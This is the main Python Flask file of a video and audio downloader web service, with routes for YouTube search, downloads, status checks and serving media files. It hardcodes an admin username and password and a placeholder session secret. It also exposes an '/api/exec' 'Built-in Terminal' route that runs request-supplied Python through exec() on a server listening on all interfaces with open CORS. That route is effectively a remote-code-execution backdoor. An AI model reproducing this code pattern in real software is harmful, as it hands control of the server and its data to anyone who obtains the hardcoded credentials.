import os
import json
import threading
from flask import Flask, request, jsonify, send_from_directory, make_response, Response, abort, session
from flask_cors import CORS

from utils.downloader import get_video_info, start_download, cancel_download
from utils.status_manager import get_status
from utils.history_manager import load_history
from utils.cleanup import cleanup_old_files, cleanup_old_videos
from utils.downloader import search_youtube

# ✅ Initialize Flask App
app = Flask(__name__)
CORS(app)
app.secret_key = 'supersecretkeychangeit'

# ✅ Directory Setup
BASE_DIR = os.path.dirname(os.path.abspath(__file__))
VIDEO_DIR = os.path.join(BASE_DIR, "static", "videos")
AUDIO_DIR = os.path.join(BASE_DIR, "static", "audios")
os.makedirs(VIDEO_DIR, exist_ok=True)
os.makedirs(AUDIO_DIR, exist_ok=True)

# ✅ Background Cleanup Task
def start_background_tasks():
    threading.Thread(target=cleanup_old_files, daemon=True).start()


start_background_tasks()

# ✅ Credentials
VALID_USERNAME = "forest_dev"
VALID_PASSWORD = "yts$4dm1n"

# ✅ Home Route (Web Console)
@app.route('/')
def home():
    return send_from_directory("web/templates", "index.html")

# ✅ Serve Downloaded Videos
@app.route('/videos/<path:filename>')
def serve_video(filename):
    return serve_media_file(VIDEO_DIR, filename)

# ✅ Serve Downloaded Audios
@app.route('/audios/<path:filename>')
def serve_audio(filename):
    return serve_media_file(AUDIO_DIR, filename)

# ✅ Shared Serve Logic
def serve_media_file(directory, filename):
    try:
        file_path = os.path.join(directory, filename)
        if not os.path.isfile(file_path):
            return jsonify({'error': 'File not found'}), 404

        ext = os.path.splitext(filename)[1].lower()
        mime_type = {
            # Video
            '.mp4': 'video/mp4',
            '.webm': 'video/webm',
            '.mkv': 'video/x-matroska',
            '.mov': 'video/quicktime',
            # Audio
            '.mp3': 'audio/mpeg',
            '.m4a': 'audio/mp4',
            '.aac': 'audio/aac',
            '.ogg': 'audio/ogg',
            '.wav': 'audio/wav'
        }.get(ext, 'application/octet-stream')

        response = make_response(send_from_directory(directory, filename, mimetype=mime_type))
        response.headers.update({
            'Access-Control-Allow-Origin': '*',
            'Content-Disposition': f'attachment; filename="{filename}"',
            'Content-Type': mime_type
        })
        return response
    except Exception as e:
        return jsonify({'error': f'Failed to serve file: {str(e)}'}), 500

# ✅ Fetch Video Info (URL)
@app.route('/fetch_info', methods=['POST'])
def fetch_info():
    try:
        data = request.get_json(force=True)
        url = data.get('url', '').strip()
        if not url:
            abort(400, "URL is required.")
        print(f"[INFO] Fetching metadata for: {url}")

        video_info = get_video_info(url)
        return Response(json.dumps(video_info), content_type='application/json')
    except Exception as e:
        return jsonify({'error': f'Exception during fetch: {str(e)}'}), 500

# ✅ In-App Browser Extraction (WebView)
@app.route('/extract', methods=['POST'])
def extract_from_webview():
    try:
        data = request.get_json(force=True)
        url = data.get('url', '').strip()
        if not url:
            return jsonify({'error': 'URL is required'}), 400
        print(f"[EXTRACT] Extracting from WebView: {url}")

        return jsonify(get_video_info(url))
    except Exception as e:
        return jsonify({'error': f'Failed to extract info: {str(e)}'}), 500

# ✅ Start Download
@app.route('/download', methods=['POST'])
def download():
    try:
        data = request.get_json(force=True)
        url = data.get('url', '').strip()
        quality = data.get('quality', '').strip()
        type_ = data.get('type', 'video').strip().lower()  # 'audio' or 'video'

        if not url or not quality:
            return jsonify({'error': 'Missing URL or quality'}), 400

        print(f"[DOWNLOAD] Starting for: {url} [{type_}]")

        download_id = start_download(url, quality, type_)
        return jsonify({'download_id': download_id, 'status': 'started'})
    except Exception as e:
        return jsonify({'error': f'Failed to start download: {str(e)}'}), 500

# ✅ Cancel Download
@app.route('/cancel/<download_id>', methods=['POST'])
def cancel(download_id):
    try:
        success = cancel_download(download_id)
        if success:
            return jsonify({'status': 'cancelled'})
        return jsonify({'error': 'Invalid download ID or already finished'}), 400
    except Exception as e:
        return jsonify({'error': f'Failed to cancel: {str(e)}'}), 500

# ✅ Check Download Status
@app.route('/status/<download_id>')
def status(download_id):
    try:
        data = get_status(download_id)
        if not data:
            return jsonify({'error': 'Invalid download ID'}), 404
        return jsonify(data)
    except Exception as e:
        return jsonify({'error': f'Status check failed: {str(e)}'}), 500

# ✅ Download History
@app.route('/history')
def history():
    try:
        return jsonify(load_history())
    except Exception as e:
        return jsonify({'error': f'Failed to load history: {str(e)}'}), 500

# ✅ Developer Login (Admin UI)
@app.route('/api/login', methods=['POST'])
def login():
    data = request.get_json()
    username = data.get('username', '').strip()
    password = data.get('password', '').strip()

    if username == VALID_USERNAME and password == VALID_PASSWORD:
        session['authenticated'] = True
        return jsonify({'success': True})
    return jsonify({'success': False, 'error': 'Invalid credentials'}), 401

# ✅ YouTube Search Route
@app.route('/api/search', methods=['POST'])
def youtube_search():
    try:
        data = request.get_json(force=True)
        query = data.get('query', '').strip()
        if not query:
            return jsonify({'error': 'Search query is required'}), 400

        print(f"[SEARCH] Query: {query}")
        results = search_youtube(query)
        return jsonify({'results': results})
    except Exception as e:
        print(f"[SEARCH ❌] {e}")
        return jsonify({'error': f'Search failed: {str(e)}'}), 500


# ✅ Built-in Terminal
@app.route('/api/exec', methods=['POST'])
def exec_code():
    if not session.get('authenticated'):
        return jsonify({'error': 'Unauthorized'}), 403

    try:
        data = request.get_json()
        code = data.get('code', '')
        local_vars = {}
        exec(code, {}, local_vars)
        return jsonify({'output': local_vars})
    except Exception as e:
        return jsonify({'error': str(e)})

# ✅ Dummy Routes (block bots)
@app.route('/favicon.ico')
@app.route('/ads.txt')
@app.route('/robots.txt')
def dummy_block():
    return '', 204

# ✅ Run the App (Local Dev)
if __name__ == '__main__':
    app.run(host='0.0.0.0', port=5000)
